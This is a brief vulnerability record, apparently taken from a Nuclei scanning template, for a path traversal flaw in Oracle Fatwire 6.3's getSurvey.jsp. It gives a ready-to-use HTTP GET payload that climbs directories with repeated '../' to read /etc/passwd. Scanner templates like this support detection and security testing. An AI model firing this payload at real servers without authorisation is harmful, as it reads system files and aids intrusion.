# Vulnerability: Oracle Fatwire 6.3 - Path Traversal
**Classification:** CWE-22
**Source:** Nuclei Template (`oracle-fatwire-lfi.yaml`)

## Description
Oracle Fatwire 6.3 suffers from a path traversal vulnerability in the getSurvey.jsp endpoint.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
```

